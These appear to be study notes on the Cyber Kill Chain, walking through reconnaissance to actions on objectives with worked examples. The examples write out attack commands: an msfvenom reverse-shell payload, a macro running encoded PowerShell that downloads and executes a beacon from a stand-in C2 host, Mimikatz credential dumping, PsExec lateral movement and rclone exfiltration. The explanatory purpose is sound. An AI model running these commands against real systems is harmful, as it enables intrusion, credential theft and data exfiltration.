Elaborated Notes with Examples
1. Reconnaissance

Attackers gather information about the target using passive (OSINT, WHOIS, DNS enumeration) and active (nmap, Shodan) techniques to identify attack surface.

Example: An attacker uses nmap -sV -p 1-65535 target.com to discover open ports 80 (Apache 2.4.49) and 22 (OpenSSH 8.0). They then use Shodan to find the same server hosts a WordPress 5.6 site, making it a target for CVE-2021-41773 (Apache path traversal) and vulnerable plugin exploitation.
2. Weaponization

The attacker creates a deliverable payload — a malicious document, script, or exploit tied to a dropper/backdoor. Toolkits like Metasploit or Cobalt Strike generate payloads tailored to the target environment.

Example: Using msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > payload.exe, the attacker generates a staged Meterpreter payload that connects back on execution. The payload is embedded inside a PDF disguised as an invoice using the EvilPDF toolkit to evade static detection.
3. Delivery

The weaponized payload is transmitted to the target via email phishing, malicious USB drops, watering hole attacks, or drive-by downloads.

Example: A spear-phishing email impersonating the company's IT department warns "Your mailbox is full — verify now to avoid deletion." The <a> link points to hxxp://malicious[.]com/invoice.docm. The attachment filename is Invoice_April2026.docm with a valid-looking 2-page document.
4. Exploitation

The payload triggers a vulnerability or social engineering vector to gain initial code execution on the target system.

Example: The .docm file contains a VBA macro that calls Shell("powershell -enc JABXAG8AZABlAHMAIAA9ACAAKAApAA=="). The PowerShell payload downloads and executes a Cobalt Strike beacon via IEX (New-Object Net.WebClient).DownloadString('hxxp://c2/malware.ps1'). The user enables macros because the document says "Protected Document — Enable Content."
5. Installation

Malware establishes persistence — writing to registry Run keys, creating scheduled tasks, or installing as a service — and may escalate privileges.

Example: The beacon writes HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Updater with value C:\Users\victim\AppData\Local\svchost.exe. A scheduled task named AdobeUpdateTask runs every 4 hours. Privilege escalation uses JuicyPotato via SeImpersonatePrivilege to gain NT AUTHORITY\SYSTEM.
6. Command & Control (C2)

Malware establishes an outbound channel to the attacker's infrastructure, commonly over HTTP/HTTPS, DNS tunneling, or custom protocols, often using domain fronting or beaconing.

Example: The beacon communicates with malicious-update[.]com/api/v2/status every 60 seconds using HTTPS with a random jitter of ±30s. The C2 traffic mimics a legitimate API with User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36. JA3 fingerprint clustering reveals the TLS handshake matches known Cobalt Strike signatures.
7. Actions on Objectives

The attacker achieves their goal — data exfiltration, ransomware deployment, lateral movement, or credential theft — using tools like Mimikatz, PsExec, or Rclone.

Example: The attacker runs mimikatz.exe "sekurlsa::logonpasswords" exit to dump domain admin credentials from lsass, then uses PsExec \\DC01 -u DOMAIN\admin cmd.exe to move laterally. Finally, they archive \\DC01\SYSVOL\* with 7-Zip and exfiltrate via rclone copy secrets.7z remote:dropbox --transfers 4.
